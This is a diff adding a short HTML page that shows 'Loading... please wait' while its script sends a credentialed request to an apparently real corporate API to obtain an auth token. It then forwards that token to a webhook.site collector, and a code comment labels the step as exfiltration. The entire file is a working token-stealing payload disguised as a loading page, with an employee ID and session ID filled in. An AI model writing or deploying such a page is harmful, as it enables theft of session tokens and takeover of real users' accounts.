@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Loading... please wait</h1>
+    <script>
+    fetch("https://jcihonp-dev-jpfpay-api.japfacomfeed.co.id/orabca/apex/get-token-apex", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        empid: "10099987",
+        sessionid: "8590811123031",
+        appid: "1040"
+      })
+    })
+    .then(res => res.text())
+    .then(data => {
+      // Exfiltrate token to webhook
+      fetch("https://webhook.site/94ea8c1e-eb9c-441d-a5f1-bb28cd417ba2", {
+        method: "POST",
+        body: data
+      });
+    });
+    </script>
+  </body>
+</html>
